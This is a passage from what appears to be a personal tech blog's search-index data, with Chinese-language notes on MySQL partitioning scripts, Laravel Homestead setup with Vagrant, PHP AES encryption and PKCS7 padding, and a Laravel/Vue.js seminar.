作为主键的优劣比较详细过程（从百万到千万表记录测试） - chuixue24 的博客 - CSDN 博客 ","date":"2019-06-25","objectID":"/blog/posts/MySQL-Partition-%E5%B0%8F%E8%A8%98/:7:0","tags":["mysql","partition"],"title":"MySQL Partition 小記","uri":"/blog/posts/MySQL-Partition-%E5%B0%8F%E8%A8%98/"},{"categories":["MySQL"],"content":"不是每張表適合做 Partition 也看 SQL 語句，通常要看所有 WHERE 條件資料依照做切割 ","date":"2019-06-25","objectID":"/blog/posts/MySQL-Partition-%E5%B0%8F%E8%A8%98/:8:0","tags":["mysql","partition"],"title":"MySQL Partition 小記","uri":"/blog/posts/MySQL-Partition-%E5%B0%8F%E8%A8%98/"},{"categories":["MySQL"],"content":"刪除 Partition 會有資料消失??! phpmyadmin 可以做刪除動作!!但發現會有少資料 解決方法 ALTER TABLE xxxxxx rename TO old_20170101_xxxxxx; CREATE TABLE `xxxxxx` ( ooooo ) ENGINE=InnoDB DEFAULT CHARSET=utf8 ; INSERT INTO xxxxxx SELECT * FROM old_20170101_xxxxxx; 不過為什麼會少資料還沒有找到原因 ","date":"2019-06-25","objectID":"/blog/posts/MySQL-Partition-%E5%B0%8F%E8%A8%98/:9:0","tags":["mysql","partition"],"title":"MySQL Partition 小記","uri":"/blog/posts/MySQL-Partition-%E5%B0%8F%E8%A8%98/"},{"categories":["MySQL"],"content":"自動建立 Partition 通过shell脚本自动增加mysql分区表的分区 - MySQL及其它开源数据库 - ITPUB论坛－中国专业的IT技术社区 $1 USER Mysql Account $2 PASS Mysql Account Pass $3 DB Mysql Logdb Version：V1.0 Creater : SongYunkui Colin_Song Crete_time：2010/12/9 Modify：1. MODIFY BY 2. ADD BY ____ ___/__/__ Add:_________ ###################################################################### BLOCK ####################################################################################### if [ $# -lt 3 ]; then echo “Please Input The Correct Args” echo “Usage Logdb_Add_Partition.sh ” exit -1 fi USER=$1 PASS=$2 DB=$3 ##config section begin CONN_MYSQL=\"-u$USER -p$PASS -s\" MYSQL_HOME=/opt/modules/mysql MYSQL_DIR=${MYSQL_HOME}/bin/mysql SHELL_BASE=/opt/sbin/Logdb LOG_DIR=${SHELL_BASE}/log OPT_NAME=add_partition MKDIR=whereis -b mkdir|awk '{print $2}' TOUCH=whereis -b touch|awk '{print $2}' DATE=whereis -b date|awk '{print $2}' if [ ! -d ${SHELL_BASE} ] then ${MKDIR} -p ${SHELL_BASE} fi if [ ! -d ${LOG_DIR} ] then ${MKDIR} -p ${LOG_DIR} fi if [ ! -d ${INI_DIR} ] then ${MKDIR} -p ${INI_DIR} fi LOG_FILE=${LOG_DIR}/${OPT_NAME}.log #config section end #working start CURRENT_DATE=${DATE} +'%Y-%m-%d' echo “${CURRENT_DATE} everything is ok, runing start” » ${LOG_FILE} #loop read the partition table and column while read TAB_NAME COL_NAME do COUNTER=1 CURRENT_YEAR=date +%Y #check the next month NEXT_MONTH=date -d next-month +%m #check the next month has many days case ${NEXT_MONTH} in 1|01|3|03|5|05|7|07|8|08|10|12) CURRENT_DAY=31 ;; 4|04|6|06|9|09|11) CURRENT_DAY=30 ;; 2|02) if [ expr ${CURRENT_YEAR} % 4 -eq 0 ]; then if [ expr ${CURRENT_YEAR} % 400 -eq 0 ]; then CURRENT_DAY=29 elif [ expr ${CURRENT_YEAR} % 100 -eq 0 ]; then CURRENT_DAY=28 else CURRENT_DAY=29 fi else CURRENT_DAY=28 fi ;; esac #work start add the every day partition while [ ${COUNTER} -le ${CURRENT_DAY} ] do #calculate the current day’s next {counter} day PATNAME_DATE=date -d \"${COUNTER} days\" +%Y%m%d COUNTER=expr ${COUNTER} + 1 PAT_DATE=date -d \"${COUNTER} days\" +%Y%m%d #change the unix_timestamp PAT_UNIX_TIMESTAMP=${MYSQL_DIR} ${CONN_MYSQL} \u003c\u003cEOF use ${DB}; select UNIX_TIMESTAMP('${PAT_DATE}'); EOF ##add partition sql V_SQL=“ALTER TABLE ${DB}.\"${TAB_NAME}” ADD PARTITION (PARTITION P\"${PATNAME_DATE}\" VALUES LESS THAN (\"${PAT_UNIX_TIMESTAMP}\"));\" echo $V_SQL #exec the sql ${MYSQL_DIR} ${CONN_MYSQL} «EOF use ${DB}; $V_SQL; EOF done done\u003c./Logdb_Partition.ini #working end END_DATE=${DATE} +'%Y-%m-%d %H:%M:%S' echo “${END_DATE} runing finished” » ${LOG_FILE} echo -e “\\n——————————————————————–” » ${LOG_FILE} \u003c/details\u003e - [Partition maintainance script for Mysql – Database Administration Blog](https://www.dbavalley.com/partition-maintainance-script-for-mysql/) - [mysql 能不能自动按日期分区（3个月如果手写要写90个partition） - OSCHINA](https://www.oschina.net/question/146658_55659) \u003cdetails\u003e \u003csummary\u003e本文備份\u003c/summary\u003e MYSQL– 每半月一个分区，自动维护 分类： Mysql/postgreSQL 2010-11-09 15:52:12 建表语句 drop table if exists terminal_parameter; CREATE TABLE terminal_parameter ( terminal_parameter_id int(11) NOT NULL AUTO_INCREMENT, serial int(11) DEFAULT NULL, network_type char(1) DEFAULT NULL, mcc int(8) DEFAULT NULL, mnc int(8) DEFAULT NULL, lac int(8) DEFAULT NULL, cellid int(8) DEFAULT NULL, bsic_psc int(8) DEFAULT NULL, ta_ec_io int(8) DEFAULT NULL, bcch_rxlev_rscp int(8) DEFAULT NULL, arfcn_uarfcn int(8) DEFAULT NULL, rxq int(8) DEFAULT NULL, c1 int(8) DEFAULT NULL, c2 int(8) DEFAULT NULL, signal_intensity int(8) DEFAULT NULL, error_rate int(8) DEFAULT NULL, alarm_type varchar(16) DEFAULT NULL, txpower int(8) DEFAULT NULL, small_running_number int(8) DEFAULT NULL, createtime datetime NOT NULL, userid int(8) NOT NULL, terminal_id int(8) DEFAULT NULL, state char(1) DEFAULT ‘0’, order_definition_id int(8) DEFAULT NULL, order_code varchar(20) DEFAULT NULL, charg_voltage float(8,2) DEFAULT NULL, battery_voltage float(8,2) DEFAULT NULL, temprad float(8,2) DEFAULT NULL, run_state int(8) DEFAULT NULL, switching_value1 int(8) DEFAULT NULL, switching_value2 int(8) DEFAULT NULL, bcch_freq","date":"2019-06-25","objectID":"/blog/posts/MySQL-Partition-%E5%B0%8F%E8%A8%98/:10:0","tags":["mysql","partition"],"title":"MySQL Partition 小記","uri":"/blog/posts/MySQL-Partition-%E5%B0%8F%E8%A8%98/"},{"categories":["Laravel"],"content":"小記 Homestead 使用方法 ","date":"2019-06-16","objectID":"/blog/posts/Homestead-%E6%9E%B6%E8%A8%AD-Laravel-%E7%92%B0%E5%A2%83%E5%B0%8F%E8%A8%98/:0:0","tags":["larvel","vagrant"],"title":"Homestead 架設 Laravel 環境小記","uri":"/blog/posts/Homestead-%E6%9E%B6%E8%A8%AD-Laravel-%E7%92%B0%E5%A2%83%E5%B0%8F%E8%A8%98/"},{"categories":["Laravel"],"content":"前言 使用 Homestead 簡單來說就是不用再本機安裝 laravel, composer 等指令 也能建立 project 所以把要建立新的專案，先做 homestead.yaml 設定 進去 vagrant ssh 可以在該資料夾下，下 laravel , composer 等等指令 ","date":"2019-06-16","objectID":"/blog/posts/Homestead-%E6%9E%B6%E8%A8%AD-Laravel-%E7%92%B0%E5%A2%83%E5%B0%8F%E8%A8%98/:1:0","tags":["larvel","vagrant"],"title":"Homestead 架設 Laravel 環境小記","uri":"/blog/posts/Homestead-%E6%9E%B6%E8%A8%AD-Laravel-%E7%92%B0%E5%A2%83%E5%B0%8F%E8%A8%98/"},{"categories":["Laravel"],"content":"安裝 vagrant 和 Virtualbox 參考:第 15 天：以 Vagrant 建置 PHP/Laravel 開發環境 - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天 ","date":"2019-06-16","objectID":"/blog/posts/Homestead-%E6%9E%B6%E8%A8%AD-Laravel-%E7%92%B0%E5%A2%83%E5%B0%8F%E8%A8%98/:2:0","tags":["larvel","vagrant"],"title":"Homestead 架設 Laravel 環境小記","uri":"/blog/posts/Homestead-%E6%9E%B6%E8%A8%AD-Laravel-%E7%92%B0%E5%A2%83%E5%B0%8F%E8%A8%98/"},{"categories":["Laravel"],"content":"VirtualBox 安裝可以直接apt install virtualbox 但這邊網路上是直接抓 deb sudo apt install ./virtualbox-5.2_5.2.4-119785~Ubuntu~xenial_amd64.deb ","date":"2019-06-16","objectID":"/blog/posts/Homestead-%E6%9E%B6%E8%A8%AD-Laravel-%E7%92%B0%E5%A2%83%E5%B0%8F%E8%A8%98/:2:1","tags":["larvel","vagrant"],"title":"Homestead 架設 Laravel 環境小記","uri":"/blog/posts/Homestead-%E6%9E%B6%E8%A8%AD-Laravel-%E7%92%B0%E5%A2%83%E5%B0%8F%E8%A8%98/"},{"categories":["Laravel"],"content":"vagrant 去官網抓 deb sudo apt install ./vagrant_2.0.1_x86_64.deb 我有用 rubygem 安裝 但就是不能用，用 deb 安裝會比較順利 ","date":"2019-06-16","objectID":"/blog/posts/Homestead-%E6%9E%B6%E8%A8%AD-Laravel-%E7%92%B0%E5%A2%83%E5%B0%8F%E8%A8%98/:2:2","tags":["larvel","vagrant"],"title":"Homestead 架設 Laravel 環境小記","uri":"/blog/posts/Homestead-%E6%9E%B6%E8%A8%AD-Laravel-%E7%92%B0%E5%A2%83%E5%B0%8F%E8%A8%98/"},{"categories":["Laravel"],"content":"安裝 Homestead vagrant box add laravel/homestead ","date":"2019-06-16","objectID":"/blog/posts/Homestead-%E6%9E%B6%E8%A8%AD-Laravel-%E7%92%B0%E5%A2%83%E5%B0%8F%E8%A8%98/:3:0","tags":["larvel","vagrant"],"title":"Homestead 架設 Laravel 環境小記","uri":"/blog/posts/Homestead-%E6%9E%B6%E8%A8%AD-Laravel-%E7%92%B0%E5%A2%83%E5%B0%8F%E8%A8%98/"},{"categories":["Laravel"],"content":"Homestead 設定工具 git clone https://github.com/laravel/homestead.git Homestead // 可以用 git tag 和有哪些版本 git checkout v8.5.1 首先說一下，沒設定 ssh 金鑰要先執行 ssh-keygen -t rsa -b 4096 -C \"{您的 Email}\" 指令產生金鑰。 是為了vagrant ssh用的 更詳細設定 第 15 天：以 Vagrant 建置 PHP/Laravel 開發環境 - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天 ","date":"2019-06-16","objectID":"/blog/posts/Homestead-%E6%9E%B6%E8%A8%AD-Laravel-%E7%92%B0%E5%A2%83%E5%B0%8F%E8%A8%98/:4:0","tags":["larvel","vagrant"],"title":"Homestead 架設 Laravel 環境小記","uri":"/blog/posts/Homestead-%E6%9E%B6%E8%A8%AD-Laravel-%E7%92%B0%E5%A2%83%E5%B0%8F%E8%A8%98/"},{"categories":["Laravel"],"content":"修改 Homestead.yaml 首先，在 homestead 目錄執行bash init.sh 設定 Homestead.yaml --- ip: \"192.168.10.10\" memory: 2048 cpus: 2 provider: virtualbox authorize: ~/.ssh/id_rsa.pub keys: - ~/.ssh/id_rsa folders: - map: ~/quickstart2 to: /home/vagrant/code sites: - map: homestead.test to: /home/vagrant/code/public databases: - homestead # ports: # - send: 50000 # to: 5000 # - send: 7777 # to: 777 # protocol: udp 主要設定有 folders 要把 map 設定自己程式路徑 to 不需要調整 有更多安裝可以看官網文件 Laravel Homestead - Laravel - The PHP Framework For Web Artisans 執行 Homestead vagrant ssh 再做 composer install php artisan migrate 這時候自己的http://localhost:8000 可以看到東西 ","date":"2019-06-16","objectID":"/blog/posts/Homestead-%E6%9E%B6%E8%A8%AD-Laravel-%E7%92%B0%E5%A2%83%E5%B0%8F%E8%A8%98/:5:0","tags":["larvel","vagrant"],"title":"Homestead 架設 Laravel 環境小記","uri":"/blog/posts/Homestead-%E6%9E%B6%E8%A8%AD-Laravel-%E7%92%B0%E5%A2%83%E5%B0%8F%E8%A8%98/"},{"categories":["Laravel"],"content":"一些 homestead.yml 設定 databases: - homestead - test1 vagrant 執行的時候會建立 databases 算是滿方便的功能 帳號/密碼 user: homestead pass: secret Laravel5.1/Homestead (0.2.7) 开发环境的部署和设置 | Laravel China 社区 Laravel Homestead：所有配置详解 | Laravel China 社区 Laravel Homestead：设置 Cron 计划任务 | Laravel China 社区 簡單完成 Laravel Task 架設 laravel/quickstart-basic at 0f8346968b2121edf4ac70bf0183821a87929b19 中级任务清单 |《Laravel 5.1 中文文档》| Laravel China 社区 Laravel Cron 定时任务 “跳坑” 点 | Laravel China 社区 2019-10-29 ","date":"2019-06-16","objectID":"/blog/posts/Homestead-%E6%9E%B6%E8%A8%AD-Laravel-%E7%92%B0%E5%A2%83%E5%B0%8F%E8%A8%98/:6:0","tags":["larvel","vagrant"],"title":"Homestead 架設 Laravel 環境小記","uri":"/blog/posts/Homestead-%E6%9E%B6%E8%A8%AD-Laravel-%E7%92%B0%E5%A2%83%E5%B0%8F%E8%A8%98/"},{"categories":["Laravel"],"content":"Homestead 設定多個 Project 方法 其實這篇沒有做 host 動作 直接 127.0.0.1 就可以連到 Laravel Project 但一個 VM 跑一個 Project 感覺不是很夠用 但這個只能手動加入/etc/hosts folders: - map: ~/laravel-webpaste to: /home/vagrant/code - map: ~/quickstart2 to: /home/vagrant/code2 sites: - map: homestead.test to: /home/vagrant/code/public - map: homestead.test2 to: /home/vagrant/code2/public folders 設定程式掛載路徑 sites 設定 hosts 網域路徑 vagrant reload --provision 會重啟 VM 跑設定 這時候再設定本機(非VM)/etc/host 192.168.10.10 homestead.test 192.168.10.10 homestead.test2 開瀏覽器輸入兩個網址就能打開 http://homestead.test http://homestead.test2 有沒有自動設定 host 方法呢? ","date":"2019-06-16","objectID":"/blog/posts/Homestead-%E6%9E%B6%E8%A8%AD-Laravel-%E7%92%B0%E5%A2%83%E5%B0%8F%E8%A8%98/:7:0","tags":["larvel","vagrant"],"title":"Homestead 架設 Laravel 環境小記","uri":"/blog/posts/Homestead-%E6%9E%B6%E8%A8%AD-Laravel-%E7%92%B0%E5%A2%83%E5%B0%8F%E8%A8%98/"},{"categories":["Laravel"],"content":"Vagrant 設定 hosts 自動化方法 解放雙手 hosts 自動化 (Vagrant-hostsupdater) | Laravel China 社區 【Homestead Master 08】还在手动修改hosts文件？-pilishen.com,做全球最好的实战教程 非常簡單，兩個步驟 vagrant plugin install vagrant-hostsupdater vagrant reload –provision 可以查看 /etc/hosts 會自動添加 hosts 資料 題外話 目前好奇 vagrant reload --provision 一般 user 下執行 竟然可以改變 root 644 /etc/hosts 檔案 有空再研究分析 原來之前下過 sudo 所以剛剛執行沒有跳出來 vagrant reload –provision 會跳出打 root 密碼 ","date":"2019-06-16","objectID":"/blog/posts/Homestead-%E6%9E%B6%E8%A8%AD-Laravel-%E7%92%B0%E5%A2%83%E5%B0%8F%E8%A8%98/:8:0","tags":["larvel","vagrant"],"title":"Homestead 架設 Laravel 環境小記","uri":"/blog/posts/Homestead-%E6%9E%B6%E8%A8%AD-Laravel-%E7%92%B0%E5%A2%83%E5%B0%8F%E8%A8%98/"},{"categories":["PHP"],"content":"最近同事搞不定 PHP7 AES 加密 由於我們從 PHP5 升級到 PHP7 我們換成 openssl 但是到 Android APP 解憑證的時候竟然驗證結果會不一樣?? 被同事抓去救火(同事也處理不行 XD) 然後不熟加密原理的我 第一件事情就是去 github 上面找 ChaoLiFL/PHP-Java-AES-Encrypt-Decrypt: Pass data AES encrypted between PHP 5.x, PHP 7.1, PHP 7.2 and Java. Support two ways of encryption and decryption: Base64, Hexadecimal. 沒想到剛好可以用!!! (運氣好) 不過還是卡在 簽章 結果會不一樣 ","date":"2019-06-15","objectID":"/blog/posts/PHP-%E7%94%A8-AES-%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E7%B5%90%E6%9E%9C%E4%BD%9C%E7%B0%BD%E7%AB%A0%E4%B8%8D%E4%B8%80%E6%A8%A3-PKCS-%E4%B8%80%E4%BA%9B%E5%8A%A0%E5%AF%86%E9%9B%9C%E8%A8%98/:0:0","tags":["php","aes"],"title":"PHP 用 AES 加密解密結果作簽章不一樣 (PKCS) \u0026 一些加密雜記","uri":"/blog/posts/PHP-%E7%94%A8-AES-%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E7%B5%90%E6%9E%9C%E4%BD%9C%E7%B0%BD%E7%AB%A0%E4%B8%8D%E4%B8%80%E6%A8%A3-PKCS-%E4%B8%80%E4%BA%9B%E5%8A%A0%E5%AF%86%E9%9B%9C%E8%A8%98/"},{"categories":["PHP"],"content":"AES 一些加密範例 今天又找了幾個 AES 加密 lyhiving/aes: 兼容 php、js、JAVA 的 AES 加密 pkuoliver/EasyAES: AES encrypt/decrypt, Android, iOS, php compatible(兼容 php, Android, iOS 平台) simplephp/php-java-AES-128-ECB: PHP \u0026\u0026 JAVA AES/ECB/PKCS5Padding 相互加解密 stevenholder/PHP-Java-AES-Encrypt: Pass data AES encrypted between PHP and Java. ","date":"2019-06-15","objectID":"/blog/posts/PHP-%E7%94%A8-AES-%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E7%B5%90%E6%9E%9C%E4%BD%9C%E7%B0%BD%E7%AB%A0%E4%B8%8D%E4%B8%80%E6%A8%A3-PKCS-%E4%B8%80%E4%BA%9B%E5%8A%A0%E5%AF%86%E9%9B%9C%E8%A8%98/:1:0","tags":["php","aes"],"title":"PHP 用 AES 加密解密結果作簽章不一樣 (PKCS) \u0026 一些加密雜記","uri":"/blog/posts/PHP-%E7%94%A8-AES-%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E7%B5%90%E6%9E%9C%E4%BD%9C%E7%B0%BD%E7%AB%A0%E4%B8%8D%E4%B8%80%E6%A8%A3-PKCS-%E4%B8%80%E4%BA%9B%E5%8A%A0%E5%AF%86%E9%9B%9C%E8%A8%98/"},{"categories":["PHP"],"content":"當日狀況 首先紀錄，先整理那天的狀態 原本我同事會先做 簽章 → AES 加密 他們做簽章 check 都通過 但是到 AES 一直失敗 後來他們使用 openssl 一直試 AES 我用了 ChaoLiFL/PHP-Java-AES-Encrypt-Decrypt: Pass data AES encrypted between PHP 5.x, PHP 7.1, PHP 7.2 and Java. Support two ways of encryption and decryption: Base64, Hexadecimal. 可以用了 (但可能沒有注意 console 後面有空白) 魔鬼總是藏在細節!! 後來套用我那個加密，發現 APP 做簽章反查竟然不正確?? 這時候我同事發現後面有空白!!! 原因是這個導致最簽章反查導致不正確 但是 PHP 內容印出來也不正確 ","date":"2019-06-15","objectID":"/blog/posts/PHP-%E7%94%A8-AES-%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E7%B5%90%E6%9E%9C%E4%BD%9C%E7%B0%BD%E7%AB%A0%E4%B8%8D%E4%B8%80%E6%A8%A3-PKCS-%E4%B8%80%E4%BA%9B%E5%8A%A0%E5%AF%86%E9%9B%9C%E8%A8%98/:2:0","tags":["php","aes"],"title":"PHP 用 AES 加密解密結果作簽章不一樣 (PKCS) \u0026 一些加密雜記","uri":"/blog/posts/PHP-%E7%94%A8-AES-%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E7%B5%90%E6%9E%9C%E4%BD%9C%E7%B0%BD%E7%AB%A0%E4%B8%8D%E4%B8%80%E6%A8%A3-PKCS-%E4%B8%80%E4%BA%9B%E5%8A%A0%E5%AF%86%E9%9B%9C%E8%A8%98/"},{"categories":["PHP"],"content":"簽章 首先講一下，我目前認知簽章是怕內容有被串改 所以正常近來如如內容 array 會改他做 json_encode 在做 base64_url_encode(內容) 會做 hash_hmac PHP: hash_hmac - Manual php 中使用 hash_hmac 函数实现 HMAC-SHA1 签名算法的来龙去脉 - dengjiexian123 的专栏 - CSDN 博客 加密和雜湊有什麼不一樣？ | Just for noting Code Sign - 程式碼數位簽章 TIPS-用 URL 傳送 Base64 編碼-黑暗執行緒 這時候還會做 base64 url encode(簽章) why 用 base64 url encode ? http://xxxx/?token=xxxxxxx 這時候不做 base64 url encode，可能就會有問題 這之間可能可以去換一些符號 (+/改為*-或._) 如上補充 url 不能放+/ PHP 處理 Base64 URL 的編碼、解碼方式 | Tsung’s Blog JSON Web Token 入门教程 - 阮一峰的网络日志 裡面也有提到 base64 url encode PS:Base64 - 維基百科，自由的百科全書，原因為何我也不確定，目前猜測可能是怕放在 url 上面?? 這時候內容會是簽章+ .(間隔符號)+內容 出來的時候我們會用 AES 加密 這時候因為是 binary，所以還會做 Base64(也可以用自己去換一些符號) APP 端接收到要做檢查 首先解 base64 url decode~~(或自訂反解 fucntion)~~ 去做 AES 解密 這時候會是 binary(但是 PHP 出來是 string?) 這邊可能還要確認 我們要再做 base64 url decode 這邊講詳細一點 簽章+ .(間隔符號)+內容 這時候可以做反簽章 簽章跟內容是分開獨立各做base64 url decode 內容解出來，在自己做 hash_hmac 可以得到自己簽章內容 這時候跟風包給的簽章內容有沒有一致? 一致就是這個資料沒有被串改 簽章講完了，重頭戲要開始了 ","date":"2019-06-15","objectID":"/blog/posts/PHP-%E7%94%A8-AES-%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E7%B5%90%E6%9E%9C%E4%BD%9C%E7%B0%BD%E7%AB%A0%E4%B8%8D%E4%B8%80%E6%A8%A3-PKCS-%E4%B8%80%E4%BA%9B%E5%8A%A0%E5%AF%86%E9%9B%9C%E8%A8%98/:3:0","tags":["php","aes"],"title":"PHP 用 AES 加密解密結果作簽章不一樣 (PKCS) \u0026 一些加密雜記","uri":"/blog/posts/PHP-%E7%94%A8-AES-%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E7%B5%90%E6%9E%9C%E4%BD%9C%E7%B0%BD%E7%AB%A0%E4%B8%8D%E4%B8%80%E6%A8%A3-PKCS-%E4%B8%80%E4%BA%9B%E5%8A%A0%E5%AF%86%E9%9B%9C%E8%A8%98/"},{"categories":["PHP"],"content":"為什麼送到 Android 有奇怪的空白字元??(PKCS7) 是 PKCS7 的關係 簡單說明一下，因為 AES 加密必須是 16 倍數(應該= =|||，是聽到這個原因) 當你資料沒有給到一定的數字，它會自動幫你補 我們當下用 workaround 方式先去解在我們資料帶===講好符號先去解取 但最佳解不是這樣做 关于 mcrypt_encrypt 和 openssl_encrypt 加密结果不一致的解决 – 继续生活 PHP 由 mcrypt 扩展加密改为 openssl 扩展加密|xiaolingzi’s blog | 生活是多彩的 | Life is colorful php 遷移 Mcrypt 至 OpenSSL 加密算法的詳細介紹（代碼示例） - 每日頭條 对称加密算法的 PKCS5 和 PKCS7 填充 | Zhiwei Li /** * PKCS7Encoder class * * 提供基于PKCS7算法的加解密接口. */ class PKCS7Encoder { public static $block_size = 32; /** * 对需要加密的明文进行填充补位 * @param $text 需要进行填充补位操作的明文 * @return 补齐明文字符串 */ function encode($text) { $block_size = self::$block_size; $text_length = strlen($text); //计算需要填充的位数 $amount_to_pad = $block_size - ($text_length % $block_size); if ( $amount_to_pad == 0 ) $amount_to_pad = $block_size; //获得补位所用的字符 $pad_chr = chr($amount_to_pad); $tmp = \"\"; for ( $index = 0; $index \u003c $amount_to_pad; $index++ ) $tmp .= $pad_chr; return $text . $tmp; } /** * 对解密后的明文进行补位删除 * @param decrypted 解密后的明文 * @return 删除填充补位后的明文 */ function decode($text) { $pad = ord(substr($text, -1)); if ($pad \u003c 1 || $pad \u003e self::$block_size) $pad = 0; return substr($text, 0, (strlen($text) - $pad)); } } // --------------------- // 作者：qq_34089779 // 来源：CSDN // 原文：https://blog.csdn.net/qq_34089779/article/details/79066961 // 版权声明：本文为博主原创文章，转载请附上博文链接！ PKCS7 算法基于 php 的加解密 - qq_34089779 的博客 - CSDN 博客 function PKCS7Padding($str, $block_size) { $padding_char = $block_size - (strlen($str) % $block_size); $padding_str = str_repeat(chr($padding_char),$padding_char); return $str.$padding_str; } function PKCS7UnPadding($str) { $char=substr($str,-1,1); $num=ord($char); if($num\u003e0 \u0026\u0026 $num \u003c= strlen($str)) { $str = substr($str, 0, -1 * $num); } return $str; } PHP 加解密算法使用 openssl 替换 mcrypt 扩展 | 牛牛大作栈 備份圖 有驗證上面兩個函示，得出來結果都是相等的。 但注意，在上面 echo 出來，網頁或 log 上面都不會有字元 要看 var_dump 會比較準 AES/CBC/PKCS5Padding 的 PHP 实现 - luoxiaojun1992 的个人空间 - OSCHINA 主要的填充算法有填充 NUL(“0”) 和 PKCS7，Mcrypt 默認使用的 NUL(“0”) 填充算法，當前已不被推薦，OpenSSL 則默認模式使用 PKCS7 對數據進行填充並對加密後的數據進行了 base64encode 編碼，所以建議開發中使用 PKCS7 對待加密數據進行填充，已保證通用性（alipay sdk 中雖然使用了 Mcrypt 加密簇，但使用 PKCS7 算法對數據進行了填充，這樣在一定程度上親和了 OpenSSL 加密算法）。 原文網址：https://kknews.cc/zh-tw/other/9pgvlpl.html php 如何 openssl_encrypt 加密解密 - 个人文章 - SegmentFault 思否 有說OPENSSL_ZERO_PADDING會自動填充 但測試結果沒有效果 OPENSSL_RAW_DATA 方式【会用 PKCS#7 进行补位】 ","date":"2019-06-15","objectID":"/blog/posts/PHP-%E7%94%A8-AES-%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E7%B5%90%E6%9E%9C%E4%BD%9C%E7%B0%BD%E7%AB%A0%E4%B8%8D%E4%B8%80%E6%A8%A3-PKCS-%E4%B8%80%E4%BA%9B%E5%8A%A0%E5%AF%86%E9%9B%9C%E8%A8%98/:4:0","tags":["php","aes"],"title":"PHP 用 AES 加密解密結果作簽章不一樣 (PKCS) \u0026 一些加密雜記","uri":"/blog/posts/PHP-%E7%94%A8-AES-%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E7%B5%90%E6%9E%9C%E4%BD%9C%E7%B0%BD%E7%AB%A0%E4%B8%8D%E4%B8%80%E6%A8%A3-PKCS-%E4%B8%80%E4%BA%9B%E5%8A%A0%E5%AF%86%E9%9B%9C%E8%A8%98/"},{"categories":["PHP"],"content":"簡單說我對簽章的定義 簽章主要目的加密，而是防止資料有被串改 ebc 是沒有 iv 的，cbc 是有 iv 的 有用 iv 會比較安全，但是 iv 長度是有限制的 lyhiving/aes: 兼容 php、js、JAVA 的 AES 加密 詳細的我就沒研究 當天跟所有公司留到半夜 4:30 回去，也許這就是技術債!!! 希望不要有上班回家的時候不要再看到太陽出來了 題外小記 matrix 做翻書效果，搭配 向量矩陣 和缓动函数速查表 有很好展示效果 jlmakes/rematrix: Matrix transformations made easy. The CSS3 Matrix Construction Set 演算法筆記 - Linear Function ","date":"2019-06-15","objectID":"/blog/posts/PHP-%E7%94%A8-AES-%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E7%B5%90%E6%9E%9C%E4%BD%9C%E7%B0%BD%E7%AB%A0%E4%B8%8D%E4%B8%80%E6%A8%A3-PKCS-%E4%B8%80%E4%BA%9B%E5%8A%A0%E5%AF%86%E9%9B%9C%E8%A8%98/:5:0","tags":["php","aes"],"title":"PHP 用 AES 加密解密結果作簽章不一樣 (PKCS) \u0026 一些加密雜記","uri":"/blog/posts/PHP-%E7%94%A8-AES-%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E7%B5%90%E6%9E%9C%E4%BD%9C%E7%B0%BD%E7%AB%A0%E4%B8%8D%E4%B8%80%E6%A8%A3-PKCS-%E4%B8%80%E4%BA%9B%E5%8A%A0%E5%AF%86%E9%9B%9C%E8%A8%98/"},{"categories":["Laravel"],"content":"今天去聽 Laravel 和 Vue.js 研討會 身為學一點 Vue.js 根想學 Laravel 這場真的還滿適合我的 就報名!! 當天回去就寫這篇 首先，今天講了很多 Laravel 的 balde 應用 講者從 View 的 balde 開始講 特別獎到 yield 預留一個空位意思 之前有一些程式會有這個關鍵字，都沒去了解(跪鍵盤 可以套用 section 進去，當場示範完成 LaraGirls|專屬女性的程式學習社群 官網 首先，他找 Boostrap 相似版面完成 HTML 排版 然後 router , view (搭配 yield, extends ,section, foreach) 一小時內完成網站排版(mockup) 講者大大還說，透過這個可以做出簡單的 mockup 在跟使用者談需求的時候 非常方便!!!! 接下來就是 Vue.js vue.js 已經包到 Laravel，之接呼叫 component 就可以了(首先載入 app.js 跟 設定 id=app) 前後端分離 有空詳細寫 這個跟 Codeigniter 比起來 View 地方差很多 不過 header 選單如何做 active 部份 有 google 查了一下 php - Setting Bootstrap navbar active class in Laravel 5 - Stack Overflow Laravel: How to Make Menu Item Active by URL/Route – Quick Admin Panel lavary/laravel-menu: A quick way to create menus in Laravel 5 研討會投影片和程式內容 在 Laravel 裡玩切版 laravel-dojo/20190604-laragirls-layout-with-blade-and-vue-1: 受邀至 LaraGirls 示範如何使用在 Laravel 裡以三種不同的方式做切版開發。此為現場實作的程式碼範例裡，Laravel 的部份。 laravel-dojo/20190604-laragirls-layout-with-blade-and-vue-2: 受邀至 LaraGirls 示範如何使用在 Laravel 裡以三種不同的方式做切版開發。此為現場實作的程式碼範例裡，Vue 的部份。 ","date":"2019-06-05","objectID":"/blog/posts/Laravel-%E6%96%B0%E6%89%8B%E5%AF%A6%E4%BD%9C-Vue-js-%E7%B0%A1%E5%96%AE%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95-%E5%92%8C-yield-%E6%87%89%E7%94%A8/:0:0","tags":["php","laravel"],"title":"Laravel 新手實作 Vue.js 簡單使用方法 和 yield 應用","uri":"/blog/posts/Laravel-%E6%96%B0%E6%89%8B%E5%AF%A6%E4%BD%9C-Vue-js-%E7%B0%A1%E5%96%AE%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95-%E5%92%8C-yield-%E6%87%89%E7%94%A8/"},{"categories":["PHP"],"content":"PHP-FPM 打開 error log 方法 | 程式狂想筆記 之前紀錄 PHP-FPM ERROR 錯誤方法 但今天發現公司的 CI 還是沒有紀錄 LOG 追查了一下原因，原來 CI 有做 set_error_handler … 這邊詳細記錄這個雷 事情是這樣的 n 個月前，我們公司用了 CI 做開發 由於第一次把 CI 放在 docker container 下 結果查看 log 